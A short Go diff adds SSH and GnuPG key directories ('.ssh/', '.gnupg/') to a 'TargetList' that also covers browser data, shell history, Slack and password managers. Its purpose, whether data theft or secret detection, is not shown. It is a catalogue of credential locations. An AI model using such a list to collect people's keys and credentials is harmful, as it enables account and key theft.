@@ -57,6 +57,11 @@ var shell = []string{
 	".history",
 }
 
+var ssh = []string{
+	".ssh/",
+	".gnupg/",
+}
+
 var messaging_social = []string{
 	// Slack
 	".config/Slack/",
@@ -149,6 +154,7 @@ var password_manager = []string{
 var TargetList = [][]string{
 	browsers,
 	shell,
+	ssh,
 	messaging_social,
 	password_manager,
 }
